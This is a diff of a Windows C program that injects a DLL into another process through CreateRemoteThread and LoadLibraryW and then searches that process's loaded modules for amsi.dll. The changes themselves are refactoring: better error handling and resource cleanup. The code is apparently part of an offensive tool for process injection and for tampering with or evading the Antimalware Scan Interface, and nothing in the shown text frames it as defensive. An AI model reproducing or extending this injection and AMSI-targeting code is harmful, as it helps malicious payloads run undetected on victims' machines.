@@ -8,7 +8,7 @@ INT main()
 	PROCESS_INFORMATION		processInformation;
 	PTHREAD_START_ROUTINE	threadRoutine;
 	PVOID					pvRemoteBuffer;
-	LPVOID					lpTargetProcessHeaderBuffer;
+	LPVOID					lpTargetProcessHeaderBuffer = NULL;
 	HMODULE					lphModule[256] = { 0 };
 	HMODULE					hRemoteModule;
 	HMODULE					hKernel32;
@@ -41,25 +41,27 @@ INT main()
 
 			WriteProcessMemory(hProcess, pvRemoteBuffer, (LPVOID)cModuleToInject, sizeof cModuleToInject, NULL);
 
-			if ((hKernel32 = GetModuleHandleA("Kernel32")) != NULL) {
-				llLoadLibraryWAddress = GetProcAddress(hKernel32, "LoadLibraryW");
-				threadRoutine = (PTHREAD_START_ROUTINE)llLoadLibraryWAddress;
+			if ((hKernel32 = GetModuleHandleA("Kernel32")) == NULL) {
+				goto Cleanup;
+			}
+			
+			llLoadLibraryWAddress = GetProcAddress(hKernel32, "LoadLibraryW");
+			threadRoutine = (PTHREAD_START_ROUTINE)llLoadLibraryWAddress;
 
-				if ((hDllThread = CreateRemoteThread(hProcess, NULL, 0, threadRoutine, pvRemoteBuffer, 0, NULL))) {
-					WaitForSingleObject(hDllThread, 1000);
+			if ((hDllThread = CreateRemoteThread(hProcess, NULL, 0, threadRoutine, pvRemoteBuffer, 0, NULL))) {
+				WaitForSingleObject(hDllThread, 1000);
 
-					// find base address of the injected benign DLL in remote process
-					EnumProcessModules(hProcess, lphModule, cbModulesSize, &dwModulesSizeNeeded);
-					ullModulesCount = dwModulesSizeNeeded / sizeof(HMODULE);
+				// find base address of the injected benign DLL in remote process
+				EnumProcessModules(hProcess, lphModule, cbModulesSize, &dwModulesSizeNeeded);
+				ullModulesCount = dwModulesSizeNeeded / sizeof(HMODULE);
 
-					for (size_t i = 0; i < ullModulesCount; i++) {
-						hRemoteModule = lphModule[i];
-						GetModuleBaseNameA(hProcess, hRemoteModule, cRemoteModuleName, sizeof(cRemoteModuleName));
+				for (size_t i = 0; i < ullModulesCount; i++) {
+					hRemoteModule = lphModule[i];
+					GetModuleBaseNameA(hProcess, hRemoteModule, cRemoteModuleName, sizeof(cRemoteModuleName));
 
-						if (strcmp(cRemoteModuleName, "amsi.dll") == 0) {
-							printf("[+] %s at %p\n", cRemoteModuleName, (VOID*)lphModule[i]);
-							goto Continue;
-						}
+					if (strcmp(cRemoteModuleName, "amsi.dll") == 0) {
+						printf("[+] %s at %p\n", cRemoteModuleName, (VOID*)lphModule[i]);
+						goto Continue;
 					}
 				}
 			}
@@ -88,18 +90,21 @@ Continue:
 	}
 
 Cleanup:
-	if (hProcess)
-		CloseHandle(hProcess);
-	if (processInformation.hProcess)
-		CloseHandle(processInformation.hProcess);
-	if (processInformation.hThread)
-		CloseHandle(processInformation.hThread);
-	if (hDllThread)
-		CloseHandle(hDllThread);
-#ifdef _DEBUG
-	//if (hProcess)
-	//	TerminateProcess(hProcess, 0);
-#endif
+	if (lpTargetProcessHeaderBuffer) 
+		HeapFree(GetProcessHeap(), 0, lpTargetProcessHeaderBuffer);
 	
-	return 0;
+	if (hProcess) 
+		CloseHandle(hProcess);
+	
+	if (processInformation.hProcess) 
+		CloseHandle(processInformation.hProcess);
+	
+	if (processInformation.hThread) 
+		CloseHandle(processInformation.hThread);
+	
+	if (hDllThread) 
+		CloseHandle(hDllThread);
+	
+		
+	return ERROR_SUCCESS;
 }
